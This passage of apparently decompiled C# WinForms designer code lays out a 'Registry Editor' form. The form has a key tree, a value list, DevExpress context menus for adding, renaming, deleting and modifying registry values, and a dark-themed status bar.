		this.hType = new System.Windows.Forms.ColumnHeader();
		this.hValue = new System.Windows.Forms.ColumnHeader();
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.selectedStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.popupMenuRegistry).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuSelectedItem).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuList).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.splitContainer).BeginInit();
		this.splitContainer.Panel1.SuspendLayout();
		this.splitContainer.Panel2.SuspendLayout();
		this.splitContainer.SuspendLayout();
		this.statusStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		base.SuspendLayout();
		this.imageRegistryDirectoryList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryDirectoryList.ImageStream");
		this.imageRegistryDirectoryList.TransparentColor = System.Drawing.Color.Transparent;
		this.imageRegistryDirectoryList.Images.SetKeyName(0, "folder.png");
		this.imageRegistryKeyTypeList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryKeyTypeList.ImageStream");
		this.imageRegistryKeyTypeList.TransparentColor = System.Drawing.Color.Transparent;
		this.imageRegistryKeyTypeList.Images.SetKeyName(0, "reg_string.png");
		this.imageRegistryKeyTypeList.Images.SetKeyName(1, "reg_binary.png");
		this.timer1.Interval = 2000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.popupMenuRegistry.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[4]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem1),
			new DevExpress.XtraBars.LinkPersistInfo(this.DeleteItemMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ReNameMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddKeyMenu)
		});
		this.popupMenuRegistry.Manager = this.barManager1;
		this.popupMenuRegistry.Name = "popupMenuRegistry";
		this.barSubItem1.Caption = "New Value";
		this.barSubItem1.Id = 2;
		this.barSubItem1.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[6]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.AddStringValue),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddBinaryValue),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddDwordValueMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddQWordMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddExStringValue),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddMultiStringValue)
		});
		this.barSubItem1.Name = "barSubItem1";
		this.AddStringValue.Caption = "String Value";
		this.AddStringValue.Id = 4;
		this.AddStringValue.Name = "AddStringValue";
		this.AddStringValue.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddStringValue_ItemClick);
		this.AddBinaryValue.Caption = "Binary Value";
		this.AddBinaryValue.Id = 5;
		this.AddBinaryValue.Name = "AddBinaryValue";
		this.AddBinaryValue.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddBinaryValue_ItemClick);
		this.AddDwordValueMenu.Caption = "Dword (32-bit) Value";
		this.AddDwordValueMenu.Id = 6;
		this.AddDwordValueMenu.Name = "AddDwordValueMenu";
		this.AddDwordValueMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddDwordValueMenu_ItemClick);
		this.AddQWordMenu.Caption = "QWord (64-bit) Value";
		this.AddQWordMenu.Id = 7;
		this.AddQWordMenu.Name = "AddQWordMenu";
		this.AddQWordMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddQWordMenu_ItemClick);
		this.AddExStringValue.Caption = "Expandable String Value";
		this.AddExStringValue.Id = 8;
		this.AddExStringValue.Name = "AddExStringValue";
		this.AddExStringValue.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddExStringValue_ItemClick);
		this.AddMultiStringValue.Caption = "MultiString Value";
		this.AddMultiStringValue.Id = 9;
		this.AddMultiStringValue.Name = "AddMultiStringValue";
		this.AddMultiStringValue.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddMultiStringValue_ItemClick);
		this.DeleteItemMenu.Caption = "Delete";
		this.DeleteItemMenu.Id = 0;
		this.DeleteItemMenu.Name = "DeleteItemMenu";
		this.DeleteItemMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DeleteItemMenu_ItemClick);
		this.ReNameMenu.Caption = "Rename";
		this.ReNameMenu.Id = 1;
		this.ReNameMenu.Name = "ReNameMenu";
		this.ReNameMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ReNameMenu_ItemClick);
		this.AddKeyMenu.Caption = "Key";
		this.AddKeyMenu.Id = 3;
		this.AddKeyMenu.Name = "AddKeyMenu";
		this.AddKeyMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(AddKeyMenu_ItemClick);
		this.barManager1.DockControls.Add(this.barDockControlTop);
		this.barManager1.DockControls.Add(this.barDockControlBottom);
		this.barManager1.DockControls.Add(this.barDockControlLeft);
		this.barManager1.DockControls.Add(this.barDockControlRight);
		this.barManager1.Form = this;
		this.barManager1.Items.AddRange(new DevExpress.XtraBars.BarItem[16]
		{
			this.DeleteItemMenu, this.ReNameMenu, this.barSubItem1, this.AddKeyMenu, this.AddStringValue, this.AddBinaryValue, this.AddDwordValueMenu, this.AddQWordMenu, this.AddExStringValue, this.AddMultiStringValue,
			this.ModifySelectedItemMenu, this.ModifySelBinaryData, this.DeleteSelItemMenu, this.RenameSelItemMenu, this.barButtonItem1, this.barSubItem2
		});
		this.barManager1.MaxItemId = 16;
		this.barDockControlTop.CausesValidation = false;
		this.barDockControlTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.barDockControlTop.Location = new System.Drawing.Point(0, 0);
		this.barDockControlTop.Manager = this.barManager1;
		this.barDockControlTop.Size = new System.Drawing.Size(788, 0);
		this.barDockControlBottom.CausesValidation = false;
		this.barDockControlBottom.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.barDockControlBottom.Location = new System.Drawing.Point(0, 559);
		this.barDockControlBottom.Manager = this.barManager1;
		this.barDockControlBottom.Size = new System.Drawing.Size(788, 0);
		this.barDockControlLeft.CausesValidation = false;
		this.barDockControlLeft.Dock = System.Windows.Forms.DockStyle.Left;
		this.barDockControlLeft.Location = new System.Drawing.Point(0, 0);
		this.barDockControlLeft.Manager = this.barManager1;
		this.barDockControlLeft.Size = new System.Drawing.Size(0, 559);
		this.barDockControlRight.CausesValidation = false;
		this.barDockControlRight.Dock = System.Windows.Forms.DockStyle.Right;
		this.barDockControlRight.Location = new System.Drawing.Point(788, 0);
		this.barDockControlRight.Manager = this.barManager1;
		this.barDockControlRight.Size = new System.Drawing.Size(0, 559);
		this.ModifySelectedItemMenu.Caption = "Modify";
		this.ModifySelectedItemMenu.Id = 10;
		this.ModifySelectedItemMenu.Name = "ModifySelectedItemMenu";
		this.ModifySelectedItemMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ModifySelectedItemMenu_ItemClick);
		this.ModifySelBinaryData.Caption = "Modify BinaryData";
		this.ModifySelBinaryData.Id = 11;
		this.ModifySelBinaryData.Name = "ModifySelBinaryData";
		this.ModifySelBinaryData.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ModifySelBinaryData_ItemClick);
		this.DeleteSelItemMenu.Caption = "Delete";
		this.DeleteSelItemMenu.Id = 12;
		this.DeleteSelItemMenu.Name = "DeleteSelItemMenu";
		this.DeleteSelItemMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DeleteItemMenu_ItemClick);
		this.RenameSelItemMenu.Caption = "Rename";
		this.RenameSelItemMenu.Id = 13;
		this.RenameSelItemMenu.Name = "RenameSelItemMenu";
		this.RenameSelItemMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RenameSelItemMenu_ItemClick);
		this.barButtonItem1.Caption = "New";
		this.barButtonItem1.Id = 14;
		this.barButtonItem1.Name = "barButtonItem1";
		this.barSubItem2.Caption = "New";
		this.barSubItem2.Id = 15;
		this.barSubItem2.Name = "barSubItem2";
		this.popupMenuSelectedItem.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[4]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.ModifySelectedItemMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ModifySelBinaryData),
			new DevExpress.XtraBars.LinkPersistInfo(this.DeleteSelItemMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RenameSelItemMenu)
		});
		this.popupMenuSelectedItem.Manager = this.barManager1;
		this.popupMenuSelectedItem.Name = "popupMenuSelectedItem";
		this.popupMenuList.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem1),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddKeyMenu)
		});
		this.popupMenuList.Manager = this.barManager1;
		this.popupMenuList.Name = "popupMenuList";
		this.splitContainer.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splitContainer.Location = new System.Drawing.Point(0, 0);
		this.splitContainer.Name = "splitContainer";
		this.splitContainer.Panel1.Controls.Add(this.tvRegistryDirectory);
		this.splitContainer.Panel2.Controls.Add(this.lstRegistryValues);
		this.splitContainer.Size = new System.Drawing.Size(786, 506);
		this.splitContainer.SplitterDistance = 261;
		this.splitContainer.TabIndex = 0;
		this.tvRegistryDirectory.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.tvRegistryDirectory.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.tvRegistryDirectory.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tvRegistryDirectory.ForeColor = System.Drawing.Color.Gainsboro;
		this.tvRegistryDirectory.HideSelection = false;
		this.tvRegistryDirectory.ImageIndex = 0;
		this.tvRegistryDirectory.ImageList = this.imageRegistryDirectoryList;
		this.tvRegistryDirectory.Location = new System.Drawing.Point(0, 0);
		this.tvRegistryDirectory.Name = "tvRegistryDirectory";
		this.tvRegistryDirectory.SelectedImageIndex = 0;
		this.tvRegistryDirectory.Size = new System.Drawing.Size(261, 506);
		this.tvRegistryDirectory.TabIndex = 0;
		this.tvRegistryDirectory.AfterLabelEdit += new System.Windows.Forms.NodeLabelEditEventHandler(tvRegistryDirectory_AfterLabelEdit);
		this.tvRegistryDirectory.BeforeExpand += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeExpand);
		this.tvRegistryDirectory.BeforeSelect += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeSelect);
		this.tvRegistryDirectory.KeyUp += new System.Windows.Forms.KeyEventHandler(tvRegistryDirectory_KeyUp);
		this.tvRegistryDirectory.MouseUp += new System.Windows.Forms.MouseEventHandler(tvRegistryDirectory_MouseUp);
		this.lstRegistryValues.BackgroundImage = (System.Drawing.Image)resources.GetObject("lstRegistryValues.BackgroundImage");
		this.lstRegistryValues.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.lstRegistryValues.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { this.hName, this.hType, this.hValue });
		this.lstRegistryValues.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lstRegistryValues.ForeColor = System.Drawing.Color.Gainsboro;
		this.lstRegistryValues.FullRowSelect = true;
		this.lstRegistryValues.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.lstRegistryValues.HideSelection = false;
		this.lstRegistryValues.Location = new System.Drawing.Point(0, 0);
		this.lstRegistryValues.Name = "lstRegistryValues";
		this.lstRegistryValues.Size = new System.Drawing.Size(521, 506);
		this.lstRegistryValues.SmallImageList = this.imageRegistryKeyTypeList;
		this.lstRegistryValues.TabIndex = 0;
		this.lstRegistryValues.UseCompatibleStateImageBehavior = false;
		this.lstRegistryValues.View = System.Windows.Forms.View.Details;
		this.lstRegistryValues.AfterLabelEdit += new System.Windows.Forms.LabelEditEventHandler(lstRegistryKeys_AfterLabelEdit);
		this.lstRegistryValues.KeyUp += new System.Windows.Forms.KeyEventHandler(lstRegistryKeys_KeyUp);
		this.lstRegistryValues.MouseUp += new System.Windows.Forms.MouseEventHandler(lstRegistryKeys_MouseClick);
		this.hName.Text = "Name";
		this.hName.Width = 173;
		this.hType.Text = "Type";
		this.hType.Width = 104;
		this.hValue.Text = "Value";
		this.hValue.Width = 214;
		this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.selectedStripStatusLabel });
		this.statusStrip1.Location = new System.Drawing.Point(0, 537);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Size = new System.Drawing.Size(788, 22);
		this.statusStrip1.SizingGrip = false;
		this.statusStrip1.TabIndex = 5;
		this.statusStrip1.Text = "statusStrip1";
		this.selectedStripStatusLabel.ForeColor = System.Drawing.Color.Gainsboro;
		this.selectedStripStatusLabel.Name = "selectedStripStatusLabel";
		this.selectedStripStatusLabel.Size = new System.Drawing.Size(16, 17);
		this.selectedStripStatusLabel.Text = "...";
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(788, 537);
		this.xtraTabControl1.TabIndex = 10;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.splitContainer);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(786, 506);
		base.Appearance.ForeColor = System.Drawing.Color.Black;
		base.Appearance.Options.UseFont = true;
		base.Appearance.Options.UseForeColor = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
		base.ClientSize = new System.Drawing.Size(788, 559);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.statusStrip1);
		base.Controls.Add(this.barDockControlLeft);
		base.Controls.Add(this.barDockControlRight);
		base.Controls.Add(this.barDockControlBottom);
		base.Controls.Add(this.barDockControlTop);
		this.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormRegistryEditor.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormRegistryEditor.IconOptions.Image");
		base.Name = "FormRegistryEditor";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Registry Editor";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormRegistryEditor_FormClosed);
		base.Load += new System.EventHandler(FrmRegistryEditor_Load);
		((System.ComponentModel.ISupportInitialize)this.popupMenuRegistry).EndInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuSelectedItem).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuList).EndInit();
		this.splitContainer.Panel1.ResumeLayout(false);
		this.splitContainer.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splitContainer).EndInit();
		this.splitContainer.ResumeLayout(false);
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
